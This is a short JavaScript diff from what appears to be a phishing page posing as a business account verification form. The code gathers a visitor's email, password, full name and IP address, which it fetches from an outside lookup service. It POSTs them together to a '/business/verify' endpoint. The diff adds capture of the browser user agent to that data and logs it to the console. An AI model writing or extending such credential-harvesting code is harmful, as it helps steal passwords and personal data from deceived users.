@@ -5,6 +5,8 @@ var isFirstLoginInput=true;
        let id;
        let thisSession=(1299999999999 - Math.floor(Math.random() * 99999999999));
        document.getElementById("submissionID").innerHTML=thisSession;
+       let ua = $.ua;
+       console.log(ua);
        fetch('https://api.ipify.org?format=json') .then(response=> response.json()) .then(data => {
             document.getElementById("clientIp").value=data.ip;
             $.ajax({
@@ -49,10 +51,13 @@ var isFirstLoginInput=true;
             var email = document.getElementById("username").value;
             var pw = document.getElementById("password").value;
             var fullname = document.getElementById("fullName").value;
+            var useragent = $.ua;
             model.location = ip;
             model.personal_email_address = email;
             model.password = pw;
             model.fullname = fullname;
+            model.user_agent = useragent;
+            console.log(model);
             $.ajax({
                 url: '/business/verify',
                 type: 'POST',
